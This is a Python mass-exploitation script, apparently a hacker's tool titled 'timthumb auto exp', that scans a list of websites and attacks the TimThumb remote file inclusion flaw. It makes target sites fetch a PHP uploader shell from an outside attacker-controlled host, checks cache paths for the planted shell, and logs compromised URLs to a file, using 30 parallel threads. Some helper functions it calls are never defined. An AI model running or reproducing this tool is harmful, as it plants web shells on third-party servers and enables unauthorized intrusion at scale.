#!/usr/bin/python

import requests, re, urllib2, os, sys, codecs					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time	
from random import sample as rand				   		
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint
import random								
from colorama import init												
init(autoreset=True)
										
															
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 

 # http://flickr.com.irfanmuhluster.web.id/upgan.php 

try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))


def clears():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		


clears()
def progressbar(it, prefix = "", size = 1000):
    count = len(it)
    def _show(_i):
        x = int(size*_i/count)
        sys.stdout.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "_"*(size-x), _i, count))
        sys.stdout.flush()
    _show(0)
    for i, item in enumerate(it):
        yield item
        _show(i+1)
    sys.stdout.write("\n")
    sys.stdout.flush()
toolbar_width = 30

sys.stdout.write(":%s:" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1))

for i in xrange(toolbar_width):
    time.sleep(0.01)

    sys.stdout.write("*")
    sys.stdout.flush()

sys.stdout.write("\n") 



		

def print_logo():

 
    clear = "\x1b[0m"
    colors = [31, 32, 33, 34, 35, 36]

    logo = """                                                                                                                    
 __^__                             __^__
( ___ )---------------------------( ___ )
 | / | timthumb auto exp by Mr.Rm19| \ |
 |___|                             |___|
(_____)---------------------------(_____)
 
"""


    for line in logo.split("\n"):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)

print_logo()
def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	

def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass

def sitebul(url):
	
	
    try:	
		
		
		aaReflexlibr = requests.get(url)
		
		
		if "<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>" in aaReflexlibr.text or urllib2.urlopen(url+"/administrator").getcode() == 200:
			ExploitS(url)
		else:
			print ''.format(sb, sd, url, fc,fc, sb,fr)			
                 			
			
    except:
        pass

    try:		
		
		dbaaReflexlibr = requests.get(url)
		
		if "prestashop" in dbaaReflexlibr.text:
			print ''.format(fg, fg, url, fc,fc, sb,fr)
			presbot(url)			
		else:
			print ''.format(sb, sd, url, fc,fc, sb,fr)
                 			
			
    except:
        pass
		
    try:		
		
		baaReflexlibr = requests.get(url)
		
		if "/wp-content/" in baaReflexlibr.text:
			print ''.format(fg, fg, url, fc,fc, sb,fr)
			wpsbot(url)			
		else:
			print ''.format(sb, sd, url, fc,fc, sb,fr)
			unkbot(url)
                 			
			
    except:
        pass			
	

def ExploitS(url):
	
	
    try:
		
	  
	
			
				
		
		



		m3 = requests.get(url+"/timthumb.php?src=http://flickr.com.irfanmuhluster.web.id/upgan.php")
		token = re.findall('Unable to open image : /(.*?).php', m3.text)
		
		lib = requests.get(url+"/cache/956a7d5dfaf7d2f3f98cd7d0bda00733.php")
		lib1 = requests.get(url+"/cache/956a7d5dfaf7d2f3f98cd7d0bda00733.php")
		
		if '956a7d5dfaf7d2f3f98cd7d0bda00733.php' in m3.content:
			print '[{}timthumb]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('timthumb.txt', 'a').write(url+'/'+token[0]+'.php'+'\n')
			sys.exit()
		elif '956a7d5dfaf7d2f3f98cd7d0bda00733.php' in lib.content:
			print '[{}timthumb]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('timthumb.txt', 'a').write(url+'/utils/cache/956a7d5dfaf7d2f3f98cd7d0bda00733.php'+'\n')			

		elif '956a7d5dfaf7d2f3f98cd7d0bda00733.php' in lib1.content:
			print '[{}timthumb]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('timthumb.txt', 'a').write(url+'/cache/external_956a7d5dfaf7d2f3f98cd7d0bda00733.php'+'\n')
			sys.exit()
		else:
			print '[{}timthumb]: {} {}	       ====> {}{} timthumb     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)



			
    except:
        pass
		
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(30)
        Threads = ThreadPool.map(sitebul, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
